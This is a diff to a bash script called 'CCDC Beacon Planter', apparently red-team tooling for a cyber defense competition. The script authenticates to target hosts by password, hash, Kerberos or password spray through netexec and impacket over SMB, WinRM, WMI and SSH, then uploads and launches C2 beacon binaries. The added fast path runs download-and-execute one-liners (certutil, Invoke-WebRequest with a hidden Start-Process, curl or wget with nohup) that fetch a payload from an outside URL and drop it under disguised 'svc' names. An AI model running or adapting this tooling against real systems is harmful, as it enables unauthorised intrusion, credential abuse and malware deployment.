@@ -1,7 +1,7 @@
 #!/bin/bash
 # ================================================
 # CCDC Beacon Planter
-# Usage: ./planter.sh <team> [host] [-p pass_or_hash] [-u user] [-w URL] [-x] [-b exe]
+# Usage: ./planter.sh <team> [host] [-p pass_or_hash] [-u user] [-w URL] [-x] [-b exe] [-v]
 #
 #   Plants C2 binaries on target(s). By default plants ALL .exe files
 #   in CWD (e.g. session.exe + beacon.exe). Use -b to pick one.
@@ -16,12 +16,13 @@
 #   -w    → fallback HTTP URL for beacon download if file transfer fails
 #   -b    → specific exe to plant (default: all .exe in CWD)
 #   -x    → use internal 172.16.x.x IPs (through proxychains)
+#   -v    → verbose/debug output (show commands, timings, errors)
 # ================================================
 
 set -uo pipefail
 
 usage() {
-  echo "Usage: $0 <team> [host] [-p password_or_hash] [-u user] [-w http_url] [-b exe] [-x]"
+  echo "Usage: $0 <team> [host] [-p password_or_hash] [-u user] [-w http_url] [-b exe] [-x] [-v]"
   echo ""
   echo "  host can be:"
   echo "    hostname  — curiosity, morality, intelligence, anger, fact, space, adventure"
@@ -33,6 +34,7 @@ usage() {
   echo "  -w URL   fallback HTTP URL to download beacon if file xfer fails"
   echo "  -b EXE   specific binary to plant (default: all .exe in CWD)"
   echo "  -x       use internal 172.16.x.x IPs (via proxychains)"
+  echo "  -v       verbose mode (show commands, timings, nxc output)"
   echo ""
   echo "Examples:"
   echo "  $0 5                               # plant all .exe on all boxes"
@@ -57,19 +59,21 @@ TARGET_ARG=""
 TIMEOUT=1
 USE_INTERNAL=0
 SPECIFIC_BIN=""
+VERBOSE=0
 
 # Grab optional positional host arg (before flags)
 if [[ $# -gt 0 && "$1" != -* ]]; then
   TARGET_ARG="$1"; shift
 fi
 
-while getopts "p:u:w:b:x" opt; do
+while getopts "p:u:w:b:xv" opt; do
   case "$opt" in
     p) PASS="$OPTARG" ;;
     u) USER_OVERRIDE="$OPTARG" ;;
     w) BEACON_URL="$OPTARG" ;;
     b) SPECIFIC_BIN="$OPTARG" ;;
     x) USE_INTERNAL=1 ;;
+    v) VERBOSE=1 ;;
     *) usage ;;
   esac
 done
@@ -134,12 +138,19 @@ if [[ ${#BEACON_FILES[@]} -eq 0 ]]; then
   BEACON_FILES=("beacon.exe")  # placeholder name for URL-only mode
 fi
 
+# URL-only fast path: skip transfer cascade, fire one-liner download+exec
+URL_ONLY=0
+if [[ -n "$BEACON_URL" && ! -f "${BEACON_FILES[0]}" ]]; then
+  URL_ONLY=1
+fi
+
 # Globals used by transfer functions — set per-binary in the plant loop
 BEACON_FILE=""
 BEACON_NAME=""
 LAST_XFER=""  # method cache: reuse what worked for previous binary on same host
 
 echo "[+] Binaries: ${BEACON_FILES[*]}"
+[[ $URL_ONLY -eq 1 ]] && echo "[+] Mode   : URL-only fast path (download+exec one-liner)"
 echo "[+] Targets : ${TARGETS[*]}"
 
 # ====================== AUTH SETUP ======================
@@ -204,15 +215,47 @@ fi
 echo ""
 
 # ====================== HELPERS ======================
+
+# Debug print — only shown with -v
+dbg() { [[ $VERBOSE -eq 1 ]] && echo "      [DBG] $*" >&2; }
+
+# Timer — returns seconds since epoch (with nanoseconds where available)
+timer_now() { date +%s%N 2>/dev/null | head -c13 || date +%s; }
+timer_diff() {
+  local start="$1" end="$2"
+  # If we got millisecond-precision timestamps (13 digits)
+  if [[ ${#start} -ge 13 && ${#end} -ge 13 ]]; then
+    local ms=$(( (end - start) ))
+    echo "$(( ms / 1000 )).$(printf '%03d' $(( ms % 1000 )))s"
+  else
+    echo "$(( end - start ))s"
+  fi
+}
+
+# Show netexec (or similar) output on failure when verbose
+dbg_output() {
+  local label="$1" rc="$2" out="$3"
+  if [[ $VERBOSE -eq 1 ]]; then
+    if [[ $rc -ne 0 ]] || ! echo "$out" | grep -qi '\[+\]'; then
+      dbg "$label FAILED:"
+      echo "$out" | head -5 | while IFS= read -r line; do
+        echo "      [DBG]   $line" >&2
+      done
+    fi
+  fi
+}
+
 declare -A PORT_CACHE
 port_open() {
   local ip="$1" port="$2"
   local key="${ip}:${port}"
   if [[ -v PORT_CACHE["$key"] ]]; then
+    dbg "port ${port} → cached ($([ ${PORT_CACHE["$key"]} -eq 0 ] && echo OPEN || echo CLOSED))"
     return ${PORT_CACHE["$key"]}
   fi
   timeout "$TIMEOUT" bash -c "echo >/dev/tcp/$ip/$port" 2>/dev/null
   PORT_CACHE["$key"]=$?
+  dbg "port ${port} → $([ ${PORT_CACHE["$key"]} -eq 0 ] && echo OPEN || echo CLOSED)"
   return ${PORT_CACHE["$key"]}
 }
 
@@ -253,8 +296,8 @@ REMOTE_PATH=""
 # Method 1: SMB put via smbclient then exec
 transfer_smb_put() {
   local ip="$1" user="$2" dest="$3"
-  [[ -z "$BEACON_FILE" ]] && return 1
-  port_open "$ip" 445 || return 1
+  [[ -z "$BEACON_FILE" ]] && { dbg "smb_put: no BEACON_FILE set"; return 1; }
+  port_open "$ip" 445 || { dbg "smb_put: port 445 closed"; return 1; }
 
   local dest_dir dest_base share rel_path
   dest_base="$(basename "$dest")"
@@ -270,7 +313,8 @@ transfer_smb_put() {
     dest="C:\\Windows\\Temp\\${dest_base}"
   fi
 
-  local out
+  dbg "smb_put: nxc smb $ip --put-file $BEACON_FILE $rel_path as $user"
+  local out t0; t0=$(timer_now)
   if [[ $USE_KERBEROS -eq 1 ]]; then
     out=$(netexec smb "$ip" -u "$user" -d "$DOMAIN" -k \
       --put-file "$BEACON_FILE" "$rel_path" 2>&1)
@@ -278,29 +322,31 @@ transfer_smb_put() {
     out=$(netexec smb "$ip" -u "$user" -d "$DOMAIN" $AUTH_FLAG "$PASS" \
       --put-file "$BEACON_FILE" "$rel_path" 2>&1)
   fi
+  dbg "smb_put: took $(timer_diff "$t0" "$(timer_now)")"
 
   if echo "$out" | grep -qi '\[+\]'; then
     REMOTE_PATH="$dest"
     return 0
   fi
+  dbg_output "smb_put" 1 "$out"
   return 1
 }
 
 # Method 2: WinRM upload + write via PowerShell
 transfer_winrm() {
   local ip="$1" user="$2" dest="$3"
-  [[ -z "$BEACON_FILE" ]] && return 1
-  port_open "$ip" 5985 || return 1
+  [[ -z "$BEACON_FILE" ]] && { dbg "winrm_xfer: no BEACON_FILE set"; return 1; }
+  port_open "$ip" 5985 || { dbg "winrm_xfer: port 5985 closed"; return 1; }
 
   # base64-encode the file for inline transfer
   local b64
   b64=$(base64 -w0 "$BEACON_FILE" 2>/dev/null || base64 "$BEACON_FILE" 2>/dev/null)
-  [[ -z "$b64" ]] && return 1
+  [[ -z "$b64" ]] && { dbg "winrm_xfer: base64 encode failed"; return 1; }
 
-  # PowerShell to decode and write
+  dbg "winrm_xfer: b64 payload ${#b64} chars → $dest as $user"
   local ps_cmd="[IO.File]::WriteAllBytes('${dest}',[Convert]::FromBase64String('${b64}'))"
 
-  local out
+  local out t0; t0=$(timer_now)
   if [[ $USE_KERBEROS -eq 1 ]]; then
     out=$(netexec winrm "$ip" -u "$user" -d "$DOMAIN" -k \
       -X "$ps_cmd" 2>&1)
@@ -308,11 +354,13 @@ transfer_winrm() {
     out=$(netexec winrm "$ip" -u "$user" -d "$DOMAIN" $AUTH_FLAG "$PASS" \
       -X "$ps_cmd" 2>&1)
   fi
+  dbg "winrm_xfer: took $(timer_diff "$t0" "$(timer_now)")"
 
   if echo "$out" | grep -qi '\[+\]'; then
     REMOTE_PATH="$dest"
     return 0
   fi
+  dbg_output "winrm_xfer" 1 "$out"
   return 1
 }
 
@@ -322,11 +370,14 @@ transfer_url_certutil() {
   [[ -z "$BEACON_URL" ]] && return 1
 
   local cmd="certutil -urlcache -split -f \"${BEACON_URL}\" \"${dest}\""
-  local out
+  local out t0
+
+  dbg "certutil: $proto $ip → $dest"
+  t0=$(timer_now)
 
   case "$proto" in
     smb)
-      port_open "$ip" 445 || return 1
+      port_open "$ip" 445 || { dbg "certutil: port 445 closed"; return 1; }
       if [[ $USE_KERBEROS -eq 1 ]]; then
         out=$(netexec smb "$ip" -u "$user" -d "$DOMAIN" -k -x "$cmd" 2>&1)
       else
@@ -334,7 +385,7 @@ transfer_url_certutil() {
       fi
       ;;
     winrm)
-      port_open "$ip" 5985 || return 1
+      port_open "$ip" 5985 || { dbg "certutil: port 5985 closed"; return 1; }
       if [[ $USE_KERBEROS -eq 1 ]]; then
         out=$(netexec winrm "$ip" -u "$user" -d "$DOMAIN" -k -x "$cmd" 2>&1)
       else
@@ -342,7 +393,7 @@ transfer_url_certutil() {
       fi
       ;;
     wmi)
-      port_open "$ip" 135 || return 1
+      port_open "$ip" 135 || { dbg "certutil: port 135 closed"; return 1; }
       if [[ $USE_KERBEROS -eq 1 ]]; then
         out=$(netexec wmi "$ip" -u "$user" -d "$DOMAIN" -k -x "$cmd" 2>&1)
       else
@@ -351,11 +402,13 @@ transfer_url_certutil() {
       ;;
     *) return 1 ;;
   esac
+  dbg "certutil ($proto): took $(timer_diff "$t0" "$(timer_now)")"
 
   if echo "$out" | grep -qi '\[+\]'; then
     REMOTE_PATH="$dest"
     return 0
   fi
+  dbg_output "certutil($proto)" 1 "$out"
   return 1
 }
 
@@ -365,11 +418,14 @@ transfer_url_iwr() {
   [[ -z "$BEACON_URL" ]] && return 1
 
   local ps_cmd="powershell -NoP -NonI -c \"IWR -Uri '${BEACON_URL}' -OutFile '${dest}'\""
-  local out
+  local out t0
+
+  dbg "iwr: $proto $ip → $dest"
+  t0=$(timer_now)
 
   case "$proto" in
     smb)
-      port_open "$ip" 445 || return 1
+      port_open "$ip" 445 || { dbg "iwr: port 445 closed"; return 1; }
       if [[ $USE_KERBEROS -eq 1 ]]; then
         out=$(netexec smb "$ip" -u "$user" -d "$DOMAIN" -k -x "$ps_cmd" 2>&1)
       else
@@ -377,7 +433,7 @@ transfer_url_iwr() {
       fi
       ;;
     winrm)
-      port_open "$ip" 5985 || return 1
+      port_open "$ip" 5985 || { dbg "iwr: port 5985 closed"; return 1; }
       if [[ $USE_KERBEROS -eq 1 ]]; then
         out=$(netexec winrm "$ip" -u "$user" -d "$DOMAIN" -k -X "$ps_cmd" 2>&1)
       else
@@ -385,7 +441,7 @@ transfer_url_iwr() {
       fi
       ;;
     wmi)
-      port_open "$ip" 135 || return 1
+      port_open "$ip" 135 || { dbg "iwr: port 135 closed"; return 1; }
       if [[ $USE_KERBEROS -eq 1 ]]; then
         out=$(netexec wmi "$ip" -u "$user" -d "$DOMAIN" -k -x "$ps_cmd" 2>&1)
       else
@@ -394,54 +450,86 @@ transfer_url_iwr() {
       ;;
     *) return 1 ;;
   esac
+  dbg "iwr ($proto): took $(timer_diff "$t0" "$(timer_now)")"
 
   if echo "$out" | grep -qi '\[+\]'; then
     REMOTE_PATH="$dest"
     return 0
   fi
+  dbg_output "iwr($proto)" 1 "$out"
   return 1
 }
 
 # ====================== EXECUTE BEACON ======================
 exec_beacon() {
-  local ip="$1" user="$2" path="$3"
-  local cmd="start /b \"\" \"${path}\""
+  local ip="$1" user="$2" path="$3" is_windows="${4:-1}"
+  local cmd
+  if [[ $is_windows -eq 1 ]]; then
+    cmd="start /b \"\" \"${path}\""
+  else
+    cmd="chmod +x '${path}' 2>/dev/null; nohup '${path}' </dev/null &>/dev/null &"
+  fi
   local out ok=1
+
+  dbg "exec: attempting to run '$path' on $ip"
 
   # Try SMB
   if port_open "$ip" 445; then
+    dbg "exec: trying nxc smb -x"
+    local t0; t0=$(timer_now)
     if [[ $USE_KERBEROS -eq 1 ]]; then
       out=$(netexec smb "$ip" -u "$user" -d "$DOMAIN" -k -x "$cmd" 2>&1)
     else
       out=$(netexec smb "$ip" -u "$user" -d "$DOMAIN" $AUTH_FLAG "$PASS" -x "$cmd" 2>&1)
     fi
-    echo "$out" | grep -qi '\[+\]' && return 0
+    dbg "exec smb: took $(timer_diff "$t0" "$(timer_now)")"
+    if echo "$out" | grep -qi '\[+\]'; then
+      dbg "exec: SUCCESS via smb"
+      return 0
+    fi
+    dbg_output "exec(smb)" 1 "$out"
   fi
 
   # Try WinRM
   if port_open "$ip" 5985; then
+    dbg "exec: trying nxc winrm -x"
+    local t0; t0=$(timer_now)
     if [[ $USE_KERBEROS -eq 1 ]]; then
       out=$(netexec winrm "$ip" -u "$user" -d "$DOMAIN" -k -x "$cmd" 2>&1)
     else
       out=$(netexec winrm "$ip" -u "$user" -d "$DOMAIN" $AUTH_FLAG "$PASS" -x "$cmd" 2>&1)
     fi
-    echo "$out" | grep -qi '\[+\]' && return 0
+    dbg "exec winrm: took $(timer_diff "$t0" "$(timer_now)")"
+    if echo "$out" | grep -qi '\[+\]'; then
+      dbg "exec: SUCCESS via winrm"
+      return 0
+    fi
+    dbg_output "exec(winrm)" 1 "$out"
   fi
 
   # Try WMI
   if port_open "$ip" 135; then
+    dbg "exec: trying nxc wmi -x"
+    local t0; t0=$(timer_now)
     if [[ $USE_KERBEROS -eq 1 ]]; then
       out=$(netexec wmi "$ip" -u "$user" -d "$DOMAIN" -k -x "$cmd" 2>&1)
     else
       out=$(netexec wmi "$ip" -u "$user" -d "$DOMAIN" $AUTH_FLAG "$PASS" -x "$cmd" 2>&1)
     fi
-    echo "$out" | grep -qi '\[+\]' && return 0
+    dbg "exec wmi: took $(timer_diff "$t0" "$(timer_now)")"
+    if echo "$out" | grep -qi '\[+\]'; then
+      dbg "exec: SUCCESS via wmi"
+      return 0
+    fi
+    dbg_output "exec(wmi)" 1 "$out"
   fi
 
   # Try smbexec
   local smbexec_bin
   smbexec_bin=$(command -v smbexec.py 2>/dev/null || command -v impacket-smbexec 2>/dev/null || echo "")
   if [[ -n "$smbexec_bin" ]] && port_open "$ip" 445; then
+    dbg "exec: trying $smbexec_bin"
+    local t0; t0=$(timer_now)
     if [[ "$AUTH_FLAG" == "-H" ]]; then
       out=$("$smbexec_bin" "${DOMAIN}/${user}@${ip}" -hashes "$PASS" -c "$cmd" 2>&1)
     elif [[ $USE_KERBEROS -eq 1 ]]; then
@@ -449,30 +537,168 @@ exec_beacon() {
     else
       out=$("$smbexec_bin" "${DOMAIN}/${user}:${PASS}@${ip}" -c "$cmd" 2>&1)
     fi
-    echo "$out" | grep -qiv 'error\|failed\|refused\|denied' && return 0
+    dbg "exec smbexec: took $(timer_diff "$t0" "$(timer_now)")"
+    if echo "$out" | grep -qiv 'error\|failed\|refused\|denied'; then
+      dbg "exec: SUCCESS via smbexec"
+      return 0
+    fi
+    dbg_output "exec(smbexec)" 1 "$out"
+  else
+    dbg "exec: smbexec not available (bin='${smbexec_bin:-not found}')"
   fi
 
-  # Try SSH (Linux boxes — just chmod +x and run in bg)
+  # Try SSH
   if port_open "$ip" 22 && [[ "$AUTH_FLAG" == "-p" ]]; then
-    local ssh_cmd="chmod +x /tmp/${BEACON_NAME} 2>/dev/null; nohup /tmp/${BEACON_NAME} &>/dev/null &"
-    out=$(netexec ssh "$ip" -u "$user" -p "$PASS" -x "$ssh_cmd" 2>&1)
-    echo "$out" | grep -qi '\[+\]' && return 0
+    dbg "exec: trying nxc ssh"
+    local ssh_exec_cmd
+    if [[ $is_windows -eq 1 ]]; then
+      ssh_exec_cmd="start /b \"\" \"${path}\""
+    else
+      ssh_exec_cmd="chmod +x '${path}' 2>/dev/null; nohup '${path}' </dev/null &>/dev/null &"
+    fi
+    dbg "exec ssh cmd: $ssh_exec_cmd"
+    local t0; t0=$(timer_now)
+    out=$(netexec ssh "$ip" -u "$user" -p "$PASS" -x "$ssh_exec_cmd" 2>&1)
+    dbg "exec ssh: took $(timer_diff "$t0" "$(timer_now)")"
+    if echo "$out" | grep -qi '\[+\]'; then
+      dbg "exec: SUCCESS via ssh"
+      return 0
+    fi
+    dbg_output "exec(ssh)" 1 "$out"
   fi
 
+  dbg "exec: ALL methods exhausted for $path on $ip"
+  return 1
+}
+
+# ====================== URL ONE-LINER (fast path) ======================
+# Single command: download + exec. No separate transfer/exec phases.
+# Uses: ip, user, is_windows, BEACON_URL, BEACON_NAME, auth globals
+url_exec_oneliner() {
+  local ip="$1" user="$2" is_windows="${3:-1}"
+  local rnd=$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 6)
+  local out t0
+
+  if [[ $is_windows -eq 1 ]]; then
+    local drop="C:\\Windows\\Temp\\svc${rnd}.exe"
+    # certutil is the most reliable on older Windows; also try curl.exe and IWR
+    local oneliner="certutil -urlcache -split -f \"${BEACON_URL}\" \"${drop}\" >nul 2>nul & start /b \"\" \"${drop}\""
+    local oneliner_ps="\$p='${drop}';IWR -Uri '${BEACON_URL}' -OutFile \$p;Start-Process \$p -WindowStyle Hidden"
+
+    # Try via SMB (cmd one-liner)
+    if port_open "$ip" 445; then
+      dbg "oneliner: nxc smb -x certutil+start"
+      t0=$(timer_now)
+      if [[ $USE_KERBEROS -eq 1 ]]; then
+        out=$(netexec smb "$ip" -u "$user" -d "$DOMAIN" -k -x "$oneliner" 2>&1)
+      else
+        out=$(netexec smb "$ip" -u "$user" -d "$DOMAIN" $AUTH_FLAG "$PASS" -x "$oneliner" 2>&1)
+      fi
+      dbg "oneliner smb: took $(timer_diff "$t0" "$(timer_now)")"
+      if echo "$out" | grep -qi '\[+\]'; then
+        echo "    [+] One-liner (certutil+exec via smb) → $drop  ($(timer_diff "$t0" "$(timer_now)"))"
+        return 0
+      fi
+      dbg_output "oneliner(smb/certutil)" 1 "$out"
+    fi
+
+    # Try via WinRM (PowerShell one-liner)
+    if port_open "$ip" 5985; then
+      dbg "oneliner: nxc winrm -X IWR+Start-Process"
+      t0=$(timer_now)
+      if [[ $USE_KERBEROS -eq 1 ]]; then
+        out=$(netexec winrm "$ip" -u "$user" -d "$DOMAIN" -k -X "$oneliner_ps" 2>&1)
+      else
+        out=$(netexec winrm "$ip" -u "$user" -d "$DOMAIN" $AUTH_FLAG "$PASS" -X "$oneliner_ps" 2>&1)
+      fi
+      dbg "oneliner winrm: took $(timer_diff "$t0" "$(timer_now)")"
+      if echo "$out" | grep -qi '\[+\]'; then
+        echo "    [+] One-liner (IWR+exec via winrm) → $drop  ($(timer_diff "$t0" "$(timer_now)"))"
+        return 0
+      fi
+      dbg_output "oneliner(winrm/iwr)" 1 "$out"
+    fi
+
+    # Try via WMI (cmd one-liner)
+    if port_open "$ip" 135; then
+      dbg "oneliner: nxc wmi -x certutil+start"
+      t0=$(timer_now)
+      if [[ $USE_KERBEROS -eq 1 ]]; then
+        out=$(netexec wmi "$ip" -u "$user" -d "$DOMAIN" -k -x "$oneliner" 2>&1)
+      else
+        out=$(netexec wmi "$ip" -u "$user" -d "$DOMAIN" $AUTH_FLAG "$PASS" -x "$oneliner" 2>&1)
+      fi
+      dbg "oneliner wmi: took $(timer_diff "$t0" "$(timer_now)")"
+      if echo "$out" | grep -qi '\[+\]'; then
+        echo "    [+] One-liner (certutil+exec via wmi) → $drop  ($(timer_diff "$t0" "$(timer_now)"))"
+        return 0
+      fi
+      dbg_output "oneliner(wmi/certutil)" 1 "$out"
+    fi
+
+    # Try via SSH (Windows OpenSSH)
+    if port_open "$ip" 22 && [[ "$AUTH_FLAG" == "-p" ]]; then
+      local ssh_cmd="certutil -urlcache -split -f \"${BEACON_URL}\" \"${drop}\" >nul 2>nul & start /b \"\" \"${drop}\""
+      dbg "oneliner: nxc ssh -x certutil+start"
+      t0=$(timer_now)
+      out=$(netexec ssh "$ip" -u "$user" -p "$PASS" -x "$ssh_cmd" 2>&1)
+      dbg "oneliner ssh: took $(timer_diff "$t0" "$(timer_now)")"
+      if echo "$out" | grep -qi '\[+\]'; then
+        echo "    [+] One-liner (certutil+exec via ssh) → $drop  ($(timer_diff "$t0" "$(timer_now)"))"
+        return 0
+      fi
+      dbg_output "oneliner(ssh/certutil)" 1 "$out"
+    fi
+
+  else
+    # Linux one-liner
+    local drop="/tmp/svc${rnd}"
+    local dl_cmd="curl -sSLo '${drop}' '${BEACON_URL}' || wget -qO '${drop}' '${BEACON_URL}'; chmod +x '${drop}'; nohup '${drop}' </dev/null &>/dev/null &"
+
+    if port_open "$ip" 22 && [[ "$AUTH_FLAG" == "-p" ]]; then
+      dbg "oneliner: nxc ssh linux dl+exec"
+      t0=$(timer_now)
+      out=$(netexec ssh "$ip" -u "$user" -p "$PASS" -x "$dl_cmd" 2>&1)
+      dbg "oneliner ssh: took $(timer_diff "$t0" "$(timer_now)")"
+      if echo "$out" | grep -qi '\[+\]'; then
+        echo "    [+] One-liner (curl+exec via ssh) → $drop  ($(timer_diff "$t0" "$(timer_now)"))"
+        return 0
+      fi
+      dbg_output "oneliner(ssh/curl)" 1 "$out"
+    fi
+  fi
+
+  echo "    [-] One-liner failed on all protocols"
   return 1
 }
 
 # ====================== TRANSFER + EXEC ONE BINARY ======================
-# Called with: transfer_exec_one <ip> <user> <hostname> <authed_proto>
+# Called with: transfer_exec_one <ip> <user> <hostname> <authed_proto> <is_windows>
 # Uses globals: BEACON_FILE, BEACON_NAME, USE_KERBEROS, AUTH_FLAG, PASS, LAST_XFER
 transfer_exec_one() {
-  local ip="$1" authed_user="$2" hostname="$3" authed_proto="$4"
+  local ip="$1" authed_user="$2" hostname="$3" authed_proto="$4" is_windows="${5:-1}"
+  local t0_xfer; t0_xfer=$(timer_now)
 
   echo "    --- ${BEACON_NAME} ---"
+
+  # ---- FAST PATH: URL-only mode → single download+exec command ----
+  if [[ $URL_ONLY -eq 1 ]]; then
+    dbg "URL_ONLY fast path — firing one-liner"
+    if url_exec_oneliner "$ip" "$authed_user" "$is_windows"; then
+      echo "    [+] PLANTED ${BEACON_NAME} on ${hostname}  ($(timer_diff "$t0_xfer" "$(timer_now)"))"
+      return 0
+    else
+      echo "    [-] One-liner failed for ${BEACON_NAME} on ${hostname}  ($(timer_diff "$t0_xfer" "$(timer_now)"))"
+      return 1
+    fi
+  fi
+
+  dbg "file=$BEACON_FILE  size=$(stat -c%s "$BEACON_FILE" 2>/dev/null || echo '?') bytes"
 
   local rand_path
   rand_path=$(random_drop_path)
   local all_dests=("$rand_path" "${SAFE_PATHS[@]/%/\\${BEACON_NAME}}")
+  dbg "drop targets: ${all_dests[*]}"
 
   REMOTE_PATH=""
   local transferred=0
@@ -494,9 +720,11 @@ transfer_exec_one() {
     for s in "${seen[@]+"${seen[@]}"}"; do [[ "$s" == "$m" ]] && { dup=1; break; }; done
     [[ $dup -eq 0 ]] && { unique+=("$m"); seen+=("$m"); }
   done
+  dbg "transfer order: ${unique[*]}$([ -n "$LAST_XFER" ] && echo " (cached=$LAST_XFER)" || true)"
 
   for method in "${unique[@]}"; do
     [[ $transferred -eq 1 ]] && break
+    dbg "trying method: $method"
     case "$method" in
       smb_put)
         for dest in "${all_dests[@]}"; do
@@ -534,34 +762,61 @@ transfer_exec_one() {
         done ;;
       scp)
         [[ -z "$BEACON_FILE" ]] && continue
+        local scp_dest
+        if [[ $is_windows -eq 1 ]]; then
+          scp_dest="C:/Windows/Temp/${BEACON_NAME}"
+        else
+          scp_dest="/tmp/${BEACON_NAME}"
+        fi
+        dbg "scp: uploading to ${authed_user}@${ip}:${scp_dest}"
         sshpass -p "$PASS" scp -o StrictHostKeyChecking=no \
-          "$BEACON_FILE" "${authed_user}@${ip}:/tmp/${BEACON_NAME}" 2>/dev/null && {
-          REMOTE_PATH="/tmp/${BEACON_NAME}"
+          "$BEACON_FILE" "${authed_user}@${ip}:${scp_dest}" 2>/dev/null && {
+          if [[ $is_windows -eq 1 ]]; then
+            REMOTE_PATH="C:\\Windows\\Temp\\${BEACON_NAME}"
+          else
+            REMOTE_PATH="/tmp/${BEACON_NAME}"
+          fi
           echo "    [+] Transferred via SCP → $REMOTE_PATH"
           LAST_XFER="scp"; transferred=1
         } ;;
       url_ssh)
         [[ -z "$BEACON_URL" ]] && continue
-        local dl_cmd="curl -sSo /tmp/${BEACON_NAME} '${BEACON_URL}' 2>/dev/null || wget -qO /tmp/${BEACON_NAME} '${BEACON_URL}' 2>/dev/null"
-        netexec ssh "$ip" -u "$authed_user" -p "$PASS" -x "$dl_cmd" 2>/dev/null && {
-          REMOTE_PATH="/tmp/${BEACON_NAME}"
+        local dl_cmd ssh_drop
+        if [[ $is_windows -eq 1 ]]; then
+          ssh_drop="C:\\Windows\\Temp\\${BEACON_NAME}"
+          # Windows: try curl.exe (built-in on Win10+), then certutil, then PowerShell IWR
+          dl_cmd="curl.exe -sSLo \"${ssh_drop}\" '${BEACON_URL}' 2>nul || certutil -urlcache -split -f '${BEACON_URL}' \"${ssh_drop}\" >nul 2>nul || powershell -NoP -c \"IWR -Uri '${BEACON_URL}' -OutFile '${ssh_drop}'\" 2>nul"
+        else
+          ssh_drop="/tmp/${BEACON_NAME}"
+          dl_cmd="curl -sSLo '${ssh_drop}' '${BEACON_URL}' 2>/dev/null || wget -qO '${ssh_drop}' '${BEACON_URL}' 2>/dev/null"
+        fi
+        dbg "url_ssh: dl_cmd=$dl_cmd"
+        local out
+        out=$(netexec ssh "$ip" -u "$authed_user" -p "$PASS" -x "$dl_cmd" 2>&1)
+        if echo "$out" | grep -qi '\[+\]'; then
+          REMOTE_PATH="$ssh_drop"
           echo "    [+] Transferred via URL download (SSH) → $REMOTE_PATH"
           LAST_XFER="url_ssh"; transferred=1
-        } ;;
+        else
+          dbg_output "url_ssh" 1 "$out"
+        fi ;;
     esac
   done
 
   if [[ $transferred -eq 0 ]]; then
     echo "    [-] All transfer methods failed for ${BEACON_NAME}"
+    dbg "transfer phase took $(timer_diff "$t0_xfer" "$(timer_now)") total"
     return 1
   fi
 
   # ---- EXECUTE ----
-  if exec_beacon "$ip" "$authed_user" "$REMOTE_PATH"; then
-    echo "    [+] LAUNCHED ${BEACON_NAME} on ${hostname}"
+  dbg "transfer done in $(timer_diff "$t0_xfer" "$(timer_now)") — starting exec phase"
+  local t0_exec; t0_exec=$(timer_now)
+  if exec_beacon "$ip" "$authed_user" "$REMOTE_PATH" "$is_windows"; then
+    echo "    [+] LAUNCHED ${BEACON_NAME} on ${hostname}  (total: $(timer_diff "$t0_xfer" "$(timer_now)"))"
     return 0
   else
-    echo "    [-] Transfer OK but execution failed for ${BEACON_NAME} on ${hostname}"
+    echo "    [-] Transfer OK but execution failed for ${BEACON_NAME} on ${hostname}  (exec took $(timer_diff "$t0_exec" "$(timer_now)"))"
     return 1
   fi
 }
@@ -569,6 +824,7 @@ transfer_exec_one() {
 # ====================== PLANT ALL BINARIES ON ONE HOST ======================
 plant_on_host() {
   local hostname="$1"
+  local t0_host; t0_host=$(timer_now)
   local ip
   if [[ $USE_INTERNAL -eq 1 ]]; then
     ip="${HOST_INTERNAL[$hostname]}"
@@ -579,6 +835,24 @@ plant_on_host() {
 
   echo "  [*] ${hostname} (${ip}) — ${#BEACON_FILES[@]} binary(ies)"
 
+  # ---- Quick port scan (verbose: show results, normal: just cache) ----
+  local open_ports=""
+  for p in 22 135 445 5985; do
+    if port_open "$ip" "$p"; then open_ports+="$p "; fi
+  done
+  if [[ $VERBOSE -eq 1 ]]; then
+    echo "    [DBG] Open ports: ${open_ports:-none}"
+  fi
+  if [[ -z "$open_ports" ]]; then
+    echo "    [-] No ports open — host unreachable"
+    return 1
+  fi
+
+  # Detect OS: if SMB/WinRM/WMI ports open, assume Windows
+  local is_windows=0
+  [[ "$open_ports" == *445* || "$open_ports" == *5985* || "$open_ports" == *135* ]] && is_windows=1
+  dbg "os detection: is_windows=$is_windows (ports: ${open_ports})"
+
   # Save auth state so kerberos fallback on one host doesn't affect others
   local save_kerberos=$USE_KERBEROS
   local save_auth_flag="$AUTH_FLAG"
@@ -586,8 +860,10 @@ plant_on_host() {
 
   # Determine authed user — try each until one works
   local authed_user="" authed_proto=""
+  local t0_auth; t0_auth=$(timer_now)
 
   for user in "${ALL_USERS[@]}"; do
+    dbg "auth: trying user=$user"
     for proto in smb winrm wmi; do
       local port
       case "$proto" in
@@ -597,6 +873,7 @@ plant_on_host() {
       esac
       port_open "$ip" "$port" || continue
 
+      dbg "auth: nxc $proto $ip -u $user $([ $USE_KERBEROS -eq 1 ] && echo '-k' || echo "$AUTH_FLAG")"
       local out
       if [[ $USE_KERBEROS -eq 1 ]]; then
         out=$(netexec "$proto" "$ip" -u "$user" -d "$DOMAIN" -k 2>&1)
@@ -609,10 +886,12 @@ plant_on_host() {
         authed_proto="$proto"
         break 2
       fi
+      dbg_output "auth($user/$proto)" 1 "$out"
     done
 
     # Try SSH
     if port_open "$ip" 22 && [[ "$AUTH_FLAG" == "-p" || $SPRAY_MODE -eq 1 ]]; then
+      dbg "auth: nxc ssh $ip -u $user"
       local out
       out=$(netexec ssh "$ip" -u "$user" -p "$PASS" 2>&1)
       if echo "$out" | grep -qi '\[+\]'; then
@@ -620,13 +899,16 @@ plant_on_host() {
         authed_proto="ssh"
         break
       fi
+      dbg_output "auth($user/ssh)" 1 "$out"
     fi
   done
 
   # ---- Kerberos fallback: if ticket auth failed, try password spray ----
   if [[ -z "$authed_user" && $USE_KERBEROS -eq 1 ]]; then
     echo "    [!] Kerberos ticket failed — falling back to password spray"
+    dbg "kerberos auth took $(timer_diff "$t0_auth" "$(timer_now)") before fallback"
     for user in "${SPRAY_USERS[@]}"; do
+      dbg "fallback: trying user=$user"
       for proto in smb winrm wmi; do
         local port
         case "$proto" in
@@ -665,18 +947,18 @@ plant_on_host() {
   fi
 
   if [[ -z "$authed_user" ]]; then
-    echo "    [-] No valid creds found — skipping"
+    echo "    [-] No valid creds found — skipping  (auth took $(timer_diff "$t0_auth" "$(timer_now)"))"
     USE_KERBEROS=$save_kerberos; AUTH_FLAG="$save_auth_flag"; PASS="$save_pass"
     return 1
   fi
-  echo "    [+] Auth: ${authed_user} via ${authed_proto}"
+  echo "    [+] Auth: ${authed_user} via ${authed_proto}  ($(timer_diff "$t0_auth" "$(timer_now)"))"
 
   # ---- Plant each binary ----
   local planted_count=0
